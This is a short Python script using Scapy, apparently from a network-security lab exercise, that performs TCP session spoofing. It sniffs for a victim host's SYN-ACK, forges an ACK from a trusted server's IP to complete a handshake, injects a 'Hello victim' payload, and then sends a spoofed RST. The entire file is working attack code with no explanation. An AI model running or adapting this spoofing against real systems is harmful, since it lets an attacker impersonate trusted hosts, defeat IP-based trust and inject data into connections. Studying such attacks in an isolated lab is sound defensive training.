from scapy.all import *
import time
x_ip = "10.9.0.5"
x_port = 9090
srv_ip = "10.9.0.69"
srv_port = 8000
syn_seq = 0x1000

def spoof(pkt):
    old_tcp = pkt[TCP]
    if old_tcp.flags == 'SA':
       ip = IP(src = srv_ip, dst = x_ip)
       tcp = TCP(sport = srv_port, dport = x_port,
                 seq = syn_seq + 1, 
                 ack = old_tcp.seq + 1,
                 flags="A")
       data = 'Hello victim\n'
       send(ip/tcp/data, verbose=0, iface='eth0')

       time.sleep(2)
       tcp.flags = "R"
       tcp.seq = syn_seq + 1 + len(data)
       send(ip/tcp, verbose=0)

f = 'tcp and src host {} and src port {} and dst host {} and dst port {}'
myFilter = f.format(x_ip, x_port, srv_ip, srv_port)
sniff(iface='eth0', filter=myFilter, prn = spoof)